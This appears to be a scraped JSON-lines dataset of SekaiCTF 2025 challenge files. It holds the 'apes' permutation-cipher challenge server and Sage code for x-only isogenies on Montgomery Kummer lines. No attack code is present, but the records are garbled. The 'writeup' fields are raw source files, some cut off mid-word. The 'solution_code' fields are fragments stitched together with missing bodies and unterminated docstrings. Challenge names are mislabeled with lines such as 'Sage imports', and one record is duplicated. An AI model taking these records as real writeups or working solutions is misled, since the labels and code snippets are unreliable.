"scraped_at": "2025-10-26T18:19:39.604047"}
{"id": "project-sekai_sekaictf-2025_if_you're_planning_to_brute_force_anyway,_let's_prevent_excessive_connections", "team": "project-sekai", "repo": "sekaictf-2025", "challenge_name": "if you're planning to brute force anyway, let's prevent excessive connections", "attack_type": "Unknown", "writeup": "import os\nFLAG = os.getenv(\"FLAG\", \"SEKAI{TESTFLAG}\")\n\ndef play():\n    plainperm = bytes.fromhex(input('Plainperm: '))\n    assert sorted(plainperm) == list(range(256)), \"Invalid permutation\"\n\n    key = os.urandom(64)\n    def f(i):\n        for k in key[:-1]:\n            i = plainperm[i ^ k]\n        return i ^ key[-1]\n\n    cipherperm = bytes(map(f, range(256)))\n    print(f'Cipherperm: {cipherperm.hex()}')\n    print('Do you know my key?')\n    return bytes.fromhex(input()) == key\n\nif __name__ == '__main__':\n    # if you're planning to brute force anyway, let's prevent excessive connections\n    while not play():\n        print('Bad luck, try again.')\n    print(f'APES TOGETHER STRONG! {FLAG}')", "solution_code": "    key = os.urandom(64)\n    def f(i):\n        for k in key[:-1]:\n            i = plainperm[i ^ k]\n        return i ^ key[-1]\n\n\n    cipherperm = bytes(map(f, range(256)))\n    print(f'Cipherperm: {cipherperm.hex()}')\n    print('Do you know my key?')\n    return bytes.fromhex(input()) == key\n\n\n    # if you're planning to brute force anyway, let's prevent excessive connections\n    while not play():\n        print('Bad luck, try again.')\n", "tools": [], "file_path": "temp_repos\\project-sekai_sekaictf-2025\\crypto\\apes\\dist\\chall.py", "file_size": 695, "scraped_at": "2025-10-26T18:19:39.619293"}
{"id": "project-sekai_sekaictf-2025_if_you're_planning_to_brute_force_anyway,_let's_prevent_excessive_connections", "team": "project-sekai", "repo": "sekaictf-2025", "challenge_name": "if you're planning to brute force anyway, let's prevent excessive connections", "attack_type": "Unknown", "writeup": "import os\nFLAG = os.getenv(\"FLAG\", \"SEKAI{TESTFLAG}\")\n\ndef play():\n    plainperm = bytes.fromhex(input('Plainperm: '))\n    assert sorted(plainperm) == list(range(256)), \"Invalid permutation\"\n\n    key = os.urandom(64)\n    def f(i):\n        for k in key[:-1]:\n            i = plainperm[i ^ k]\n        return i ^ key[-1]\n\n    cipherperm = bytes(map(f, range(256)))\n    print(f'Cipherperm: {cipherperm.hex()}')\n    print('Do you know my key?')\n    return bytes.fromhex(input()) == key\n\nif __name__ == '__main__':\n    # if you're planning to brute force anyway, let's prevent excessive connections\n    while not play():\n        print('Bad luck, try again.')\n    print(f'APES TOGETHER STRONG! {FLAG}')", "solution_code": "    key = os.urandom(64)\n    def f(i):\n        for k in key[:-1]:\n            i = plainperm[i ^ k]\n        return i ^ key[-1]\n\n\n    cipherperm = bytes(map(f, range(256)))\n    print(f'Cipherperm: {cipherperm.hex()}')\n    print('Do you know my key?')\n    return bytes.fromhex(input()) == key\n\n\n    # if you're planning to brute force anyway, let's prevent excessive connections\n    while not play():\n        print('Bad luck, try again.')\n", "tools": [], "file_path": "temp_repos\\project-sekai_sekaictf-2025\\crypto\\apes\\challenge\\app\\chall.py", "file_size": 695, "scraped_at": "2025-10-26T18:19:39.621162"}
{"id": "project-sekai_sekaictf-2025_Sage_imports", "team": "project-sekai", "repo": "sekaictf-2025", "challenge_name": "Sage imports", "attack_type": "ECC", "writeup": "\"\"\"\nUnderneath everything, our isogenies are on the Kummer line\n\nL : x^3 + Ax^2 + x\n\nAnd we perform our x-only isogenies by working with the x-coordinates\nrepresented projectively as x(P) = (X : Z) which we call KummerPoints\n\nHowever, for FESTA(+) we always need the full point eventually for either\nadditions or the (2,2)-isogeny, so we need a way to recover the full point.\n\nThe trick we use is that we always evaluate our isogenies on torsion bases, \nso we can use the Weil pairing to recover phi(P) up to an overall sign.\n\nThis file takes elliptic curves and points on these curves, maps them to the\nKummer line, performs fast x-only isogeny computations and then lifts the\nresult back to full points on the codomain curves.\n\"\"\"\n\n# Sage imports\nfrom sage.all import gcd, randint\nfrom sage.structure.element import RingElement\n\n# Local Imports\nfrom montgomery_isogenies.kummer_line import KummerLine\nfrom montgomery_isogenies.kummer_isogeny import KummerLineIsogeny\nfrom utilities.supersingular import torsion_basis\nfrom utilities.pairing import weil_pairing_pari\n\n# =========================================================== #\n#    Compute an isogeny and codomain using x-only algorithms  #\n# =========================================================== #\n\ndef _random_isogeny_x_only(E, D):\n    \"\"\"\n    Helper function to compute one step in the isogeny\n    chain for `random_isogeny_x_only`. \n    \"\"\"\n    # Compute a random point of order D to act as our\n    # isogeny kernel\n    k = randint(0, D)\n    P, Q = torsion_basis(E, D)\n    K = P + k*Q\n\n    # Map curve and kernel to Kummer Line\n    L = KummerLine(E)\n    xK = L(K[0])\n\n    # Use x-only arithmetic to compute an isogeny \n    # and codomain\n    phi = KummerLineIsogeny(L, xK, D)\n\n    # Compute the curve from the Kummer Line\n    codomain = phi.codomain().curve()\n\n    # Speed up SageMath by setting the order of the curve\n    p = E.base_ring().characteristic()\n    codomain.set_order((p+1)**2, num_checks=0)\n    \n    return phi, codomain\n\ndef random_isogeny_x_only(E, D):\n    \"\"\"\n    Computes a D-degree isogeny from E using\n    x-only arithmetic and returns the KummerIsogeny\n    together with the codomain curve.\n\n    When D does not divide the available torsion,\n    the isogeny is computed in steps with the \n    helper function _random_isogeny_x_only\n    \"\"\"\n    deg = 1\n    phi_list = []\n    p = E.base_field().characteristic()\n\n    # Compute isogenies of degree gcd(D // deg, p+1)\n    # until an isogeny of degree D is computed\n    while deg != D:\n        next_deg = gcd(D // deg, p+1)\n        phi, E = _random_isogeny_x_only(E, next_deg)\n        deg *= next_deg\n\n        phi_list.append(phi)\n    \n    # Create a composite x-only isogeny from factors\n    phi = KummerLineIsogeny.from_factors(phi_list)\n    return phi, E\n\ndef isogeny_from_scalar_x_only(E, D, m, basis=None):\n    \"\"\"\n    Computes a D-degree isogeny from E using\n    x-only arithmetic and returns the KummerIsogeny\n    together with the codomain curve.\n\n    The isogeny has a kernel K which is computed from\n    the canonical basis E[D] = <P,Q> and given scalar(s)\n    of the form:\n        K = P + [m]Q     or     K = [a]P + [b]Q\n    depending on whether m is a scalar, or a length two \n    tuple of scalars\n    \"\"\"\n    # Allow a precomputed basis\n    if not basis:\n        P, Q = torsion_basis(E, D)\n    else:\n        P, Q = basis\n\n    # Allow either an integer or tuple of integers\n    if isinstance(m, RingElement) or isinstance(m, int):\n        K = P + m*Q\n    else:\n        assert len(m) == 2\n        K = m[0]*P + m[1]*Q\n\n    # Map curve and kernel to Kummer Line\n    L = KummerLine(E)\n    xK = L(K)\n\n    # Use x-only arithmetic to compute an isogeny \n    # and codomain\n    phi = KummerLineIsogeny(L, xK, D)\n\n    # Compute the curve from the Kummer Line\n    codomain = phi.codomain().curve()\n\n    # Speed up SageMath by setting the order of the curve\n    p = E.base_ring().characteristic()\n    codomain.set_order((p+1)**2, num_checks=0)\n\n    return phi, codomain\n\n# ================================================= #\n#    Evaluate an x-only isogeny on a torsion basis  #\n# ================================================= #\n\ndef lift_image_to_curve(P, Q, ximP, ximQ, n, d):\n    \"\"\"\n    Given the torsion basis <P, Q> = E[n]\n    and the x-coordinates of the images x(phi(P))\n    and x(phi(P)) of a degree d-isogeny compute \n    the image of the full points up to an overall sign:\n        ±phi(P), ±phi(Q)\n    \"\"\"\n    # Lift the points to the curve\n    imPb = ximP.curve_point()\n    imQb = ximQ.curve_point()\n    \n    # Compute two pairings\n    pair_E0 = weil_pairing_pari(P, Q, n)\n    pair_E1 = weil_pairing_pari(imPb, imQb, n)\n    \n    # Correct the sign\n    if pair_E0**d != pair_E1:\n        imQb = -imQb\n\n    return imPb, imQb\n\ndef evaluate_isogeny_x_only(phi, P, Q, n, d):\n    \"\"\"\n    Given an x-only isogeny phi degree d, and the torsion basis\n    <P,Q> = E[n], compute the image of the torsion basis up to\n    and overall sign: ±phi(P), ±phi(Q)\n\n    Does", "solution_code": "    # Compute the curve from the Kummer Line\n    codomain = phi.codomain().curve()\n\n\n    \"\"\"\n    Computes a D-degree isogeny from E using\n    x-only arithmetic and returns the KummerIsogeny\n    together with the codomain curve.\n\n\n    # Create a composite x-only isogeny from factors\n    phi = KummerLineIsogeny.from_factors(phi_list)\n    return phi, E\n\n\n    \"\"\"\n    Computes a D-degree isogeny from E using\n    x-only arithmetic and returns the KummerIsogeny\n    together with the codomain curve.\n\n\n    # Compute the curve from the Kummer Line\n    codomain = phi.codomain().curve()\n\n\n    # Extract x-coordinates from points and convert to KummerPoints\n    xP, xQ = L0(P[0]), L0(Q[0])\n", "tools": ["sage"], "file_path": "temp_repos\\project-sekai_sekaictf-2025\\crypto\\alter-ego\\solution\\montgomery_isogenies\\isogenies_x_only.py", "file_size": 5513, "scraped_at": "2025-10-26T18:19:39.638125"}
{"id": "project-sekai_sekaictf-2025_Sage_imports", "team": "project-sekai", "repo": "sekaictf-2025", "challenge_name": "Sage imports", "attack_type": "ECC", "writeup": "\"\"\"\nImplementation of x-only isogenies between the Kummer Lines of \nMontgomery Curves\n\nTaken from:\nhttps://github.com/jack4818/KummerIsogeny\n\n===========================================================================\n\nUSAGE:\n\nphi = KummerLineIsogeny(domain, kernel, degree)\n\nThe codomain is accessed using `phi.codomain()` and the  elliptic curve \ncan be lifted from the KummerLine `phi.dodomain().curve()`.\n\nEvaluation of the isogeny is done via `phi(xQ)` for some KummerPoint `xQ`.\n\nNOTE:\n\nWhere the degree can be composite, but for efficiency needs to be smooth.\nFor a 2-isogeny, the point P = (0,0) cannot be used as a kernel \n\n========================================================================\n\nINFO:\n\nHeavily inspired by the SageMath isogeny classes, this file implements\nx-only Montgomery isogenies using the KummerLine and KummerPoint classes\nfrom `kummer_line.py` for the (co)domains and kernel points.\n\nThe algorithms in this file all come from the following literature:\n\nVélu-like algorithms:\n\n    Even torsion algorithms from: https://ia.cr/2017/1198\n    Computing Isogenies between Montgomery Curves Using the Action of (0, 0)\n    Joost Renes\n\n    Odd torsion algorithms: https://ia.cr/2017/504.pdf\n    A simple and compact algorithm for SIDH with arbitrary degree isogenies\n    Craig Costello and Huseyin Hisil\n\n    Codomain computation for velu formula from: https://ia.cr/2018/782\n    A faster way to the CSIDH\n    Michael Meyer and Steffen Reith\n\nVéluSqrt for large ell isogenies \n\n    VéluSqrt: https://velusqrt.isogeny.org/\n    Faster computation of isogenies of large prime degree\n    Daniel J. Bernstein, Luca De Feo, Antonin Leroux, Benjamin Smith\n\nFuture Work: \n\n- Optimise VéluSqrt, it seems to be underperforming with a threshold of about 1000\n  rather than 100 \n- Include isomorphisms of Kummer Lines\n- allow composition by defining __mul__ on isogenies to create a composite isogeny\n\"\"\"\n\n# Sage imports\nfrom sage.all import prod, ZZ, PolynomialRing\nfrom sage.rings.generic import ProductTree\n\n# Local imports\nfrom montgomery_isogenies.kummer_line import KummerLine, KummerPoint\n\n# =================================================== #\n# Generic class for creating an isogeny between       #\n# KummerLines of Montgomery model curves using x-only #\n# arithmetic                                          #\n# =================================================== #\n\n\nclass KummerLineIsogeny_Generic:\n    \"\"\"\n    Generic class for Kummer Line isogenies which we build on top of for\n    the Vélu, VéluSqrt and Composite isogeny classes\n    \"\"\"\n\n    def __init__(self):\n        self._degree = None\n        self._domain = None\n        self._codomain = None\n        pass\n\n    def __repr__(self):\n        return f\"Isogeny of degree {(self._degree).factor()} from {self._domain} to {self._codomain}\"\n\n    @staticmethod\n    def validate_input(domain, kernel, degree, check=True):\n        \"\"\"\n        Helper function to check the input to the isogeny class is well-formed\n        \"\"\"\n        if not isinstance(domain, KummerLine):\n            raise ValueError(f\"not a kummer line: {domain}\")\n\n        if not isinstance(kernel, KummerPoint):\n            raise ValueError(f\"not a kummer point: {kernel}\")\n\n        if kernel.parent() != domain:\n            raise ValueError(f\"Kernel {kernel} is not a point on {domain}\")\n\n        if check:\n            # TODO actually check order with has_order_D function\n            assert (\n                degree * kernel\n            ).is_zero(), \"Input point does not have correct order\"\n\n    def domain(self):\n        \"\"\"\n        Return the domain of the isogeny\n        \"\"\"\n        return self._domain\n\n    def codomain(self):\n        \"\"\"\n        Return the codomain of the isogeny\n        \"\"\"\n        return self._codomain\n\n    def degree(self):\n        \"\"\"\n        Return the degree of the isogeny\n        \"\"\"\n        return self._degree\n\n\n# =================================================== #\n# Computation of isogenies between Kummer lines using #\n# x-only formula by Costello-Hisil-Renes              #\n# =================================================== #\n\n\nclass KummerLineIsogeny_Velu(KummerLineIsogeny_Generic):\n    \"\"\"\n    Computes prime degree isogenies with Vélu-like formula.\n\n    - When ell is odd, we use Costello-Hisil (https://ia.cr/2017/504)\n    - When ell is even, we can use Renes (https://ia.cr/2017/1198) providing\n    that the kernel is not (0,0)\n\n    TODO: use isomorphisms to change the model of the curve if (0,0) is a\n    kernel point\n    \"\"\"\n\n    def __init__(self, domain, kernel, degree, check=True):\n        # Check the input to the isogeny is well-formed\n        self.validate_input(domain, kernel, degree, check=check)\n\n        # Set kernel and degree and domain\n        self._degree = degree\n        self._kernel = kernel\n        self._domain = domain\n\n        # Compute the codomain, we need different formula for even and\n        # odd degree\n        if self._degree == 2:\n            # We cannot use the", "solution_code": "    def __init__(self):\n        self._degree = None\n        self._domain = None\n        self._codomain = None\n        pass\n\n\n    def __repr__(self):\n        return f\"Isogeny of degree {(self._degree).factor()} from {self._domain} to {self._codomain}\"\n\n\n    @staticmethod\n    def validate_input(domain, kernel, degree, check=True):\n        \"\"\"\n        Helper function to check the input to the isogeny class is well-formed\n        \"\"\"\n        if not isinstance(domain, KummerLine):\n            raise ValueError(f\"not a kummer line: {domain}\")\n\n\n    def domain(self):\n        \"\"\"\n        Return the domain of the isogeny\n        \"\"\"\n        return self._domain\n\n\n    def codomain(self):\n        \"\"\"\n        Return the codomain of the isogeny\n        \"\"\"\n        return self._codomain\n\n\n    def degree(self):\n        \"\"\"\n        Return the degree of the isogeny\n        \"\"\"\n        return self._degree\n\n\n    def __init__(self, domain, kernel, degree, check=True):\n        # Check the input to the isogeny is well-formed\n        self.validate_input(domain, kernel, degree, check=check)\n\n\n    def __call__(self, P):\n        \"\"\"\n        phi(xP) evaluates the Kummer point xP\n        \"\"\"\n        if not isinstance(P, KummerPoint):\n            raise ValueError\n        if self._degree == 2:\n            return self._evaluate_isogeny_even(P)\n        return self._evaluate_isogeny(P)\n\n\n    def _precompute_edwards_multiples(self, d):\n        \"\"\"\n        These multiples are used in both codomain\n        computation and isogeny evaluation. We precompute\n        them once during initialisation and we can then\n        reuse them for every evaluation\n        \"\"\"\n        # Compute the [i]K for i in [1...d]\n        K_muls = self._kernel.multiples()\n        E_muls = []\n        for _ in range(d):\n            Ki = next(K_muls)\n            KX, KZ = Ki.XZ()\n            YE = KX - KZ\n            ZE = KX + KZ\n            E_muls.append((YE, ZE))\n        return E_muls\n\n\n    def _compute_codomain_constants(self):\n        \"\"\"\n        When ell is odd, we compute the codomain using the Meyer and Reith\n        Twised Edwards trick (https://ia.cr/2018/782)\n        \"\"\"\n        # Extract Montgomery constants\n        A, C = self._domain.extract_constants()\n\n\n    def _compute_codomain_constants_even(self):\n        \"\"\"\n        When ell is even, we compute the codomain constants\n        using Renes formula\n        \"\"\"\n        # Extract kernel point\n        XK, ZK = self._kernel.XZ()\n        assert XK, \"XK Cannot be zero\"\n\n\n    def _compute_codomain(self):\n        \"\"\"\n        Wrapper function to compute the codomain L = x^3 + x^2A' + x in\n        projective coordinates: A' = (A' : C') We use different formula\n        depending on whether the isogeny degree ell is even or odd\n        \"\"\"\n        # Compute the codomain constants, need different formula for\n        # odd and even ell\n        if self._degree == 2:\n            A_codomain, C_codomain = self._compute_codomain_constants_even()\n        else:\n            A_codomain, C_codomain = self._compute_codomain_constants()\n\n\n    def _evaluate_isogeny(self, P):\n        \"\"\"\n        Costello-Hisil (https://ia.cr/2017/504) formula for\n        evaluating an odd degree isogeny on the point P\n        \"\"\"\n        XP, ZP = P.XZ()\n        Psum = XP + ZP\n        Pdiff = XP - ZP\n\n\n        # Loop through the d-multiples, these are\n        # precomputed from the codomain computation\n        X_new, Z_new = 1, 1\n        for EY, EZ in self._edwards_multiples:\n            diff_EZ = Pdiff * EZ\n            sum_EY = EY * Psum\n            X_new *= diff_EZ + sum_EY\n            Z_new *= diff_EZ - sum_EY\n\n\n    def _evaluate_isogeny_even(self, P):\n        \"\"\"\n        Renes (https://ia.cr/2017/1198) formula for\n        evaluating an even degree isogeny on the point P\n        \"\"\"\n        XK, ZK = self._kernel.XZ()\n        assert XK, \"XK cannot be zero\"\n\n\n    r\"\"\"\n    Helper function to evaluate a resultant with `h_I` quickly,\n    using the product tree, taken from FastEllipticPolynomial\n    sage/src/sage/schemes/elliptic_curves/hom_velusqrt.py\n\n\n    def __init__(self, domain, kernel, degree, check=True):\n        # Check the input to the isogeny is well-formed\n        self.validate_input(domain, kernel, degree, check=check)\n\n\n    def __call__(self, P):\n        \"\"\"\n        Evaluate the isogeny phi on the point P\n        by using phi(P)\n        \"\"\"\n        if not isinstance(P, KummerPoint):\n            raise ValueError\n        return self._evaluate_isogeny(P)\n\n\n    def _hI_resultant(self, poly):\n        \"\"\"\n        Compute the resultant Res(hI, poly) where\n        hI has been computed and stored as a product tree\n        \"\"\"\n        return product_tree_resultant(self.hI_tree, poly)\n\n\n    def _hI_precomputation(self, ker, b, c):\n        r\"\"\"\n        Compute the polynomial\n\n\n    def _Fs(self, X1, X2):\n        \"\"\"\n        Elliptic Resultants for Montgomery curves\n        \"\"\"\n        X1X2 = X1 * X2\n        polys = (\n            (X1 - X2) ** 2,\n            -2 * ((X1X2 + 1) * (X1 + X2) + 2 * self.a * X1X2),\n            (X1X2 - 1) ** 2,\n        )\n        return polys\n\n\n    def _EJ_precomputation(self, ker, b):\n        \"\"\"\n        The polynomials for EJ are of the form\n\n\n    def _hK_precomputation(self, ker, ell, b, c):\n        r\"\"\"\n        Compute the polynomial\n\n\n    def _compute_codomain_constants(self):\n        \"\"\"\n        Compute the codomain constant in projective coordinates\n        (A : C) using the VéluSqrt adaptation of the Meyers-Reith\n        Twisted Edwards curve trick\n        \"\"\"\n        # These are the polynomials for alpha = 1 and alpha = -1\n        E0J = prod(F0 + F1 + F2 for F0, F1, F2 in self.EJ_parts)\n        E1J = prod(F0 - F1 + F2 for F0, F1, F2 in self.EJ_parts)\n\n\n    def _compute_codomain(self):\n        \"\"\"\n        Wrapper function to compute the codomain L = x^3 + x^2A' + x in\n        projective coordinates: A' = (A' : C')\n        \"\"\"\n        A_codomain, C_codomain = self._compute_codomain_constants()\n        F = self._domain.base_ring()\n        return KummerLine(F, [A_codomain, C_codomain])\n\n\n    def _evaluate_isogeny(self, P):\n        \"\"\"\n        Evaluate the isogeny phi at the point P\n\n\n        # Compute two polynomials from giant steps\n        EJ1 = prod((F0 * alpha + F1) * alpha + F2 for F0, F1, F2 in self.EJ_parts)\n        EJ0 = EJ1.reverse()\n\n\n    - Uses the sparse strategy from the SIDH paper for computing\n      prime power degree isogenies\n    - Uses VéluSqrt when the prime order isogeny has degree > threshold\n    \"\"\"\n\n\n    def sparse_isogeny_prime_power(P, l, e, split=0.8, threshold=1000):\n        \"\"\"\n        Compute chain of isogenies quotienting\n        out a point P of order l**e\n        https://trac.sagemath.org/ticket/34239\n        \"\"\"\n\n\n        def recursive_sparse_isogeny(Q, k):\n            assert k\n            if k == 1:  # base case\n                return [KummerLineIsogenyAlgorithm(Q.parent(), Q, l, check=False)]\n\n\n    # TODO: Deal with isomorphisms\n    # Easy option: just use the Sage isomorphisms from K.curve() and map down\n    # Better option: just write the isomorphisms of Montgomery curves\n    # I have these computed for the FESTA code, so I just have to move them\n    # around!\n    if cofactor == 1:\n        raise NotImplementedError(\n            \"Isomorphisms between Kummer Lines are not yet implemented\"\n        )\n\n\n    def __init__(self, domain, kernel, degree, check=True, threshold=1500):\n        # Check the input to the isogeny is well-formed\n        self.validate_input(domain, kernel, degree, check=check)\n\n\n    def __call__(self, P):\n        \"\"\"\n        Evaluate the composite isogeny by calling phi(P)\n        \"\"\"\n        return evaluate_factored_kummer_isogeny(self._phis, P)\n\n\n    @classmethod\n    def from_factors(cls, maps):\n        \"\"\"\n        Sometimes we will have factors of some isogeny from a\n        different context and we want to simply collect them\n        together to create a single object.\n", "tools": ["sage"], "file_path": "temp_repos\\project-sekai_sekaictf-2025\\crypto\\alter-ego\\solution\\montgomery_isogenies\\kummer_isogeny.py", "file_size": 23805, "scraped_at": "2025-10-26T18:19:39.658699"}
{"id": "project-sekai_sekaictf-2025_===================================================_#", "team": "project-sekai", "repo": "sekaictf-2025", "challenge_name": "=================================================== #", "attack_type": "ECC", "writeup": "\"\"\"\nImplementation of the Kummer Line of Montgomery Curves and the corresponding\nKummer Points used for x-only Montgomery curve arithmetic\n\nTaken from:\nhttps://github.com/jack4818/KummerIsogeny\n\n===========================================================================\n\nINFO: Construction\n\nA KummerLine can be constructed straight from a Montgomery curve:\n\nE = EllipticCurve(F, [0,A,0,1,0])\nK = KummerLine(E)\n\nOr, it can be constructed from the Montgomery coefficient\n\nK = KummerLine(F, A)\n\nAdditionally, we allow A = (A : C) to be stored projectively and\nwe can construct this by\n\nK = KummerLine(F, [A, C])\n\nA KummerPoint can be constructed from coordinates\n\nxP = K(X, Z)\n\nWhere x(P) = (X : Z) is the x-coordinate in projective XZ-coordinates\n\nA KummerPoint can also be made straight from an elliptic curve point\n\nE = EllipticCurve(F, [0,A,0,1,0])\nP = E.random_point()\n\nK = KummerLine(E)\nxP = K(P)\n\n===========================================================================\n\nINFO: Usage\n\nThe methods of the KummerLine class are fairly straight-forward. Currently\nmissing is a check for whether two curves are isomorphic over the base field.\n\nFor this, we need an isomorphism between KummerLines which is a TODO.\n\nFor the points, scalar multiplication is performed by n*xP\n\nAdditionally, one can call `xP.double()` to perform x-only point addition\nand xP.add(xQ, xPQ) to perform differential addition to recover xP + xQ\nwhere xPQ = x(P - Q).\n\nThe 3 point ladder `xQ.ladder_3_pt(xP, xPQ, m) computes xP + [m]xQ\n\nxP.multiples() generates values [l]xP by repeated differential addition. This\nis used for isogeny computations where we want to collect the the first d points\nfor an isogeny of degree ell = 2d+1.\n\"\"\"\nimport cypari2\n\npari = cypari2.Pari()\n\nfrom sage.all import cached_method, Integer, EllipticCurve\n\nfrom sage.structure.element import RingElement\nfrom sage.schemes.elliptic_curves.ell_generic import EllipticCurve_generic\nfrom sage.schemes.elliptic_curves.ell_point import EllipticCurvePoint_field\n\nfrom utilities.fast_roots import sqrt_Fp2\n\n# =================================================== #\n#     Class for the Kummer Line x(x^2 + Ax + 1)       #\n# =================================================== #\n\n\nclass KummerLine:\n    def __init__(self, *args):\n        self._curve = None\n\n        # Allow the creation of the Kummer Line from an EllipticCurve\n        if len(args) == 1:\n            (curve,) = args\n            if not isinstance(curve, EllipticCurve_generic):\n                raise TypeError(\"not an elliptic curve\")\n            ainvs = curve.a_invariants()\n            A, C = ainvs[1], 1\n            if ainvs != (0, A, 0, 1, 0):\n                raise ValueError(\"Must use Montgomery model\")\n            self._curve = curve\n            self._base_ring = curve.base_ring()\n\n        # Allow the creation of the Kummer line from a base field and coeffs.\n        elif len(args) == 2:\n            base_ring, curve_constants = args\n            # Extract curve constants\n            if isinstance(curve_constants, Integer) or len(curve_constants) == 1:\n                A = curve_constants\n                C = 1\n            elif len(curve_constants) == 2:\n                A, C = curve_constants\n            else:\n                raise ValueError(\n                    \"The Montgomery coefficient must either be a single scalar a, or\\\n                    a tuple [A, C] representing a = A/C.\"\n                )\n            self._base_ring = base_ring\n        else:\n            raise ValueError(\n                \"A Kummer Line must be constructed from either a Montgomery curve, or\\\n                    a base field and tuple representing the coefficient A/C = [A, C]\"\n            )\n\n        # init variables\n        self._A = self._base_ring(A)\n        self._C = self._base_ring(C)\n\n        self._A = pari(A)\n        self._C = pari(C)\n\n        # Make sure the curve is not singular\n        if (self._A**2 - 4 * self._C**2) == 0:\n            raise ValueError(\n                f\"Constants {curve_constants} do not define a Montgomery curve\"\n            )\n\n    def __eq__(self, other):\n        \"\"\"\n        Test equality of two curves\n        \"\"\"\n        if self.base_ring() != other.base_ring():\n            return False\n        return self._A * other._C == other._A * self._C\n\n    def __repr__(self):\n        \"\"\"\n        String representation of the class\n        \"\"\"\n        if self.a():\n            return f\"Kummer line of the Montgomery curve y^2 = x^3 + {self.a()}*x^2 + x over {self.base_ring()}\"\n        else:\n            return f\"Kummer line of the Montgomery curve y^2 = x^3 + x over {self.base_ring()}\"\n\n    def __call__(self, coords):\n        \"\"\"\n        Create a Kummer Point with this Kummer Line as the parent\n        \"\"\"\n        return KummerPoint(self, coords)\n\n    def base_ring(self):\n        \"\"\"\n        Return the base ring of the Kummer Line\n        \"\"\"\n        return self._base_ring\n\n    def extract_constants(self):\n        \"\"\"\n        Return the Montgomery coe", "solution_code": "    def __init__(self, *args):\n        self._curve = None\n\n\n        # Allow the creation of the Kummer Line from an EllipticCurve\n        if len(args) == 1:\n            (curve,) = args\n            if not isinstance(curve, EllipticCurve_generic):\n                raise TypeError(\"not an elliptic curve\")\n            ainvs = curve.a_invariants()\n            A, C = ainvs[1], 1\n            if ainvs != (0, A, 0, 1, 0):\n                raise ValueError(\"Must use Montgomery model\")\n            self._curve = curve\n            self._base_ring = curve.base_ring()\n\n\n        # Allow the creation of the Kummer line from a base field and coeffs.\n        elif len(args) == 2:\n            base_ring, curve_constants = args\n            # Extract curve constants\n            if isinstance(curve_constants, Integer) or len(curve_constants) == 1:\n                A = curve_constants\n                C = 1\n            elif len(curve_constants) == 2:\n                A, C = curve_constants\n            else:\n                raise ValueError(\n                    \"The Montgomery coefficient must either be a single scalar a, or\\\n                    a tuple [A, C] representing a = A/C.\"\n                )\n            self._base_ring = base_ring\n        else:\n            raise ValueError(\n                \"A Kummer Line must be constructed from either a Montgomery curve, or\\\n                    a base field and tuple representing the coefficient A/C = [A, C]\"\n            )\n\n\n    def __eq__(self, other):\n        \"\"\"\n        Test equality of two curves\n        \"\"\"\n        if self.base_ring() != other.base_ring():\n            return False\n        return self._A * other._C == other._A * self._C\n\n\n    def __repr__(self):\n        \"\"\"\n        String representation of the class\n        \"\"\"\n        if self.a():\n            return f\"Kummer line of the Montgomery curve y^2 = x^3 + {self.a()}*x^2 + x over {self.base_ring()}\"\n        else:\n            return f\"Kummer line of the Montgomery curve y^2 = x^3 + x over {self.base_ring()}\"\n\n\n    def __call__(self, coords):\n        \"\"\"\n        Create a Kummer Point with this Kummer Line as the parent\n        \"\"\"\n        return KummerPoint(self, coords)\n\n\n    def base_ring(self):\n        \"\"\"\n        Return the base ring of the Kummer Line\n        \"\"\"\n        return self._base_ring\n\n\n    def extract_constants(self):\n        \"\"\"\n        Return the Montgomery coefficient A as a tuple\n        representing the projective form (A : C)\n        \"\"\"\n        return self._A, self._C\n\n\n    def AC(self):\n        return self.extract_constants()\n\n\n    def AC24(self):\n        A,C = self.AC()\n        return A+2*C, 4*C\n\n\n    def zero(self):\n        \"\"\"\n        Return the identity point on the Kummer Line\n        \"\"\"\n        return self(None)\n\n\n    def curve(self):\n        \"\"\"\n        Lift the Kummer Line to an elliptic curve as a\n        SageMath EllipticCurve\n        \"\"\"\n        if not self._curve:\n            self._curve = self.montgomery_curve()\n        return self._curve\n\n\n    @cached_method\n    def montgomery_curve(self):\n        \"\"\"\n        Compute the Montgomery Curve associated with the\n        Kummer Line\n        \"\"\"\n        F = self.base_ring()\n        a = self.a()\n        return EllipticCurve(F, [0, a, 0, 1, 0])\n\n\n    @cached_method\n    def short_weierstrass_curve(self):\n        \"\"\"\n        Compute the Isomorphic curve in the short Weierstrass model\n        associated with the Kummer Line\n        \"\"\"\n        F = self.base_ring()\n        A = self.a()\n\n\n    @cached_method\n    def j_invariant(self):\n        \"\"\"\n        Compute the j-invariant of the Kummer Line\n        \"\"\"\n        j_num = 256 * (self._A**2 - 3 * self._C**2) ** 3\n        j_den = self._C**4 * (self._A**2 - 4 * self._C**2)\n        return j_num / j_den\n\n\n    @cached_method\n    def a(self):\n        \"\"\"\n        Compute the Montgomery coefficient as a value\n        in the base field\n        \"\"\"\n        return self._A / self._C\n\n\n    def __init__(self, parent, coords):\n        # Ensure the parent is the right type\n        if not isinstance(parent, KummerLine):\n            raise TypeError(\"not a Montgomery Kummer line\")\n\n\n        # Point at infinity\n        if coords is None:\n            coords = (Integer(1), Integer(0))\n        # Construct point from P on an elliptic curve in Montgomery form\n        elif isinstance(coords, EllipticCurvePoint_field):\n            # Make sure point's parent curve matches with Kummer Line\n            a = parent.a()\n            assert coords.curve().a_invariants() == (0, a, 0, 1, 0)\n            coords = coords[0], coords[2]\n        # Construct from X coordinate only\n        elif isinstance(coords, RingElement):\n            coords = (coords,)\n        # Construct from a tuple (X : Z)\n        else:\n            coords = tuple(coords)\n\n\n    def __repr__(self):\n        return f\"[{self._X} : {self._Z}]\"\n        # return f\"Kummer Point [{self._X} : {self._Z}] on {self._parent}\"\n\n\n    def __bool__(self):\n        \"\"\"\n        A point represents False if it is the point at infinity and\n        True otherwise\n        \"\"\"\n        return bool(self._Z)\n\n\n    def __eq__(self, other):\n        \"\"\"\n        Equality of two Kummer Points\n        \"\"\"\n        if not isinstance(other, KummerPoint):\n            raise ValueError(\"Can only compare equality between to Kummer Points\")\n        if self._parent != other._parent:\n            return False\n        return self._X * other._Z == other._X * self._Z\n\n\n    def is_zero(self):\n        \"\"\"\n        A Kummer Point is considered Zero if it is the identity point\n        on the parent curve\n        \"\"\"\n        return self._Z == 0\n\n\n    def base_ring(self):\n        \"\"\"\n        Get the base ring of the Kummer Point coordinates\n        \"\"\"\n        return self._base_ring\n\n\n    def parent(self):\n        \"\"\"\n        Get the Kummer Line of which this point is constructed on\n        \"\"\"\n        return self._parent\n\n\n    def XZ(self):\n        \"\"\"\n        Return the projective (X : Z) coordinates of the point\n        \"\"\"\n        return self._X, 